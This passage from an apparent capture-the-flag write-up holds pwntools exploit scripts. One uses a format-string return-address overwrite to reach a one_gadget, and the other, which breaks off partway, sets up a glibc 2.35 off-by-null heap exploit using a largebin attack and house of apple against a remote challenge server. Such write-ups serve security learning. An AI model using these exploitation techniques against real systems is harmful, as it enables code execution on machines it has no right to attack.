</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#p=remote(&#34;chals.sekai.team&#34;,4001)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#libc=ELF(&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">rn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>  <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">dbg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="o">=</span><span class="kc">None</span>  <span class="p">:</span> <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xff</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">pr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mydbg</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s2">&#34;b *0x401239&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">&#34;./ez_fmt&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span><span class="p">(</span><span class="s2">&#34;There is a gift for you &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">stack_addr</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;stack_addr&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">w_addr</span><span class="o">=</span><span class="mh">0x0404010</span> 
</span></span><span class="line"><span class="cl"><span class="n">ret_addr</span><span class="o">=</span><span class="n">stack_addr</span><span class="o">-</span><span class="mh">0x8</span>
</span></span><span class="line"><span class="cl"><span class="n">start_addr</span><span class="o">=</span><span class="mh">0x4010B0</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;ret_addr&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="s2">&#34;%19$p&#34;</span><span class="o">+</span><span class="s2">&#34;%&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">start_addr</span><span class="o">&amp;</span><span class="mh">0xfffff</span><span class="p">)</span><span class="o">-</span><span class="mi">14</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;c&#34;</span><span class="o">+</span><span class="s2">&#34;%9$hn&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sl</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">rn</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mh">0x24083</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;libc_base&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">one_gadgt</span><span class="o">=</span><span class="mh">0xe3b01</span><span class="o">+</span><span class="n">libc_base</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ru</span><span class="p">(</span><span class="s2">&#34;There is a gift for you &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ret1_addr</span><span class="o">=</span><span class="n">stack_addr</span><span class="o">-</span><span class="mh">0xe8</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;one_gadgt&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="s2">&#34;%&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">one_gadgt</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;c&#34;</span><span class="o">+</span><span class="s2">&#34;%10$hhn&#34;</span><span class="o">+</span><span class="s2">&#34;%&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(((</span><span class="n">one_gadgt</span><span class="o">&gt;&gt;</span><span class="mi">8</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffff</span><span class="p">)</span><span class="o">-</span><span class="p">(</span><span class="n">one_gadgt</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">))</span><span class="o">+</span><span class="s2">&#34;c%11$hn&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">ret1_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">ret1_addr</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 class="heading-element" id="warmup23"><span>warmup23</span>
  <a href="#warmup23" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>glibc 2.35 下的off by null，和glibc 2.31下的off by null 利用手法相同。</p>
<p>参考链接：http://tttang.com/archive/1614/#toc__6</p>
<p>构造出堆块重叠后进行largebin attack，修改stderr为fake file。然后利用off by null 修改top chunk size，申请一个大的chunk，触发malloc_assert ，利用house of apple  执行orw。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&#34;120.24.69.11&#34;</span><span class="p">,</span><span class="mi">12700</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#p=process(&#39;./warmup&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">rn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>  <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">dbg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="o">=</span><span class="kc">None</span>  <span class="p">:</span> <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xff</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="n">info</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">pr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mydbg</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s2">&#34;dir ~/glibc/glibc-2.35/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">menu</span><span class="p">(</span><span class="n">choice</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">choice</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">menu</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Size:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Note:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">menu</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Index:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Note:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">menu</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Index:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x418</span><span class="p">,</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x100</span><span class="p">)</span> <span class="c1">#0 A = P-&gt;fd</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0xe8</span><span class="p">,</span><span class="s2">&#34;barrier&#34;</span><span class="p">)</span> <span class="c1">#1 barrier</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x438</span><span class="p">,</span> <span class="s2">&#34;B0&#34;</span><span class="o">*</span><span class="mh">0x100</span><span class="p">)</span> <span class="c1">#2 B0 helper</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x448</span><span class="p">,</span> <span class="s2">&#34;C0&#34;</span><span class="o">*</span><span class="mh">0x100</span><span class="p">)</span> <span class="c1">#3 C0 = P , P&amp;0xff = 0</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x108</span><span class="p">,</span><span class="s1">&#39;4&#39;</span><span class="o">*</span><span class="mh">0x100</span><span class="p">)</span> <span class="c1">#4 barrier</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x488</span><span class="p">,</span> <span class="s2">&#34;H&#34;</span><span class="o">*</span><span class="mh">0x100</span><span class="p">)</span> <span class="c1"># H0. helper for write bk-&gt;fd. vitcim chunk.</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x428</span><span class="p">,</span> <span class="s2">&#34;D&#34;</span><span class="o">*</span><span class="mh">0x100</span><span class="p">)</span> <span class="c1"># 6 D = P-&gt;bk</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x108</span><span class="p">,</span><span class="s2">&#34;barrier&#34;</span><span class="p">)</span> <span class="c1"># 7 barrier</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#A</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="c1">#c0</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="c1">#d</span>
</span></span><span class="line"><span class="cl"><span class="c1">#unsortedbin: D-C0-A   C0-&gt;FD=A</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># merge B0 with C0. preserve p-&gt;fd p-&gt;bk</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x458</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x438</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x561</span><span class="p">)[:</span><span class="o">-</span><span class="mi">2</span><span class="p">])</span>  <span class="c1">#index 0 put A,D into largebin, split BC. use B1 to set p-&gt;size=0x551</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x428</span><span class="p">,</span><span class="s1">&#39;A&#39;</span><span class="p">)</span>  <span class="c1">#2 C1 from ub</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x428</span><span class="p">,</span><span class="s1">&#39;A&#39;</span><span class="p">)</span>  <span class="c1">#3 bk  D  from largebin</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x418</span><span class="p">,</span><span class="s2">&#34;0&#34;</span><span class="o">*</span><span class="mh">0x100</span><span class="p">)</span>  <span class="c1">#6 fd    A from largein</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="c1">#A</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1">#c1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># unsortedbin: C1-A ,   A-&gt;BK = C1</span>
